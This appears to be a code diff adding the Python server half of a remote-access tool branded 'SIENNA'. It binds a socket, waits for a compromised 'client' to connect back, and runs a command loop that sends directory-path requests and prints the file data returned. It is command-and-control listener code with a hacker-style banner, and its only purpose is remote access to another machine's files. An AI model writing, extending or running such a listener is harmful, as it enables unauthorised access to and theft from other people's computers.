@@ -1,0 +1,98 @@
+import socket
+import sys
+import os
+import ast
+from colorama import Fore, init
+
+init(convert=True)
+
+ip = sys.argv[1]
+port = sys.argv[2]
+
+s = socket.socket()
+
+conn = ""
+addr = ""
+
+banner = f"""
+
+
+
+    {Fore.LIGHTMAGENTA_EX}███████╗██╗███████╗███╗   ██╗ █████╗ 
+    {Fore.LIGHTBLUE_EX}██╔════╝██║██╔════╝████╗  ██║██╔══██╗
+    {Fore.LIGHTMAGENTA_EX}███████╗██║█████╗  ██╔██╗ ██║███████║
+    {Fore.LIGHTBLUE_EX}╚════██║██║██╔══╝  ██║╚██╗██║██╔══██║
+    {Fore.LIGHTMAGENTA_EX}███████║██║███████╗██║ ╚████║██║  ██║
+    {Fore.LIGHTBLUE_EX}╚══════╝╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝
+
+
+
+"""
+
+format = f"     {Fore.LIGHTBLACK_EX}[{Fore.LIGHTMAGENTA_EX}!{Fore.LIGHTBLACK_EX}] {Fore.LIGHTBLUE_EX}"
+
+def reset():
+    global s
+    global conn
+    global addr
+
+    s = socket.socket()
+    conn = ""
+    addr = ""
+
+def clear():
+    os.system("cls")
+
+def reload():
+    reset()
+    clear()
+    print(banner)
+    bind_server()
+    commandHQ()
+
+def bind_server():
+    global conn
+    global addr
+
+    s.bind((str(ip), int(port)))
+
+    print(format + "Successfully binded to client! Now listening..")
+
+    s.listen()
+
+    print(format + "Successfully started listening to client! Now reversing TCP Proxy..")
+
+    conn,addr = s.accept()
+
+    print(format + "Successfully connected to client, IP: " + str(ip) + " on Port: "+ str(port))
+
+def commandHQ():
+    global conn
+    global addr
+
+    while True:
+
+        command = input(format)
+
+        if command == "1":
+            try:
+                dir_path = input(format + "Enter directory: ")
+                message = str(["sfisd", dir_path])
+                message = message.encode()
+                conn.send(message)
+            except:
+                reload()
+
+        if(conn.recv):
+
+            incoming_message = conn.recv(1024)
+            incoming_message = incoming_message.decode()
+            incoming_message = ast.literal_eval(incoming_message)
+
+            if(incoming_message[0] == "sfisd"): # 1
+                print(format + "Data received: {}".format(incoming_message[1]))
+
+clear()
+print(banner)
+bind_server()
+commandHQ()
